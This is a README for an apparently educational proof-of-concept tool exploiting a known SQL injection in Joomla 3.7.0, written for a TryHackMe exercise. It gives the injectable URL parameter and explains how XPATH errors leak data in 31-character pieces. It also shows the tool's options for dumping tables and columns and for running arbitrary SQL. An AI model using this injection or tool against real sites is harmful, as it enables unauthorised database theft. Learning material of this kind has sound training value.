# CVE-2017-8917 Joomla 3.7.0 Unauthenticated SQL Injection

Exploit developed by Sai Putravu

## Introduction

The CMS Joomla version 3.7.0 has an unsantised user input when visiting the URL:
http://localhost/index.php?option=com\_fields&view=fields&layout=modal&list[fullordering]=updatexml'

This leads to an SQL injection with error reporting, which can be utilised by an attacker to gain arbitrary file inclusion as well as sensitive Information Disclosure.

I have developed this PoC script in order to learn more about SQL Injections as well as complete the TryHackMe machine Daily Bugle.

## What I learnt and resources

- ORDER BY injections and nested SQL injections
- XPATH errors leak information inside the errors
- Joomla hides the SQL database table names (look at secret\_prefix)
- The actual error is limited to 31 characters, so you have to leak one string in parts
- Python concurrent requests

## Usage

```bash
$ python CVE_2017_8917.py --help
usage: CVE_2017_8917.py [-h] [-f] [-p] [-d] [--table TABLE] [--columns COLUMNS [COLUMNS ...]] [--tables] [-o OUTDIR] [--current_db] url                                                                    

Sai's PoC exploit for CVE-2017-8917, Joomla 3.7.0

positional arguments:
  url                   Base url to exploit

optional arguments:
  -h, --help            show this help message and exit
  -f, --free_play       Execute custom SQL queries
  -p, --secret_prefix   Get secret prefix
  -d, --database        Extract database name
  --table TABLE         Extract with context to table
  --columns COLUMNS [COLUMNS ...]
                        Dump columns from table. 'ALL' dumps every column
  --tables              Extract table columns
  -o OUTDIR, --outdir OUTDIR
                        Specify directory to write output to
  --current_db          Extract anything in context with current database
```

You can input your own (escaped) SQL queries using 

```bash
$ python CVE_2017_8917.py -f 
sqli> select database()
Joomla
sqli>
```
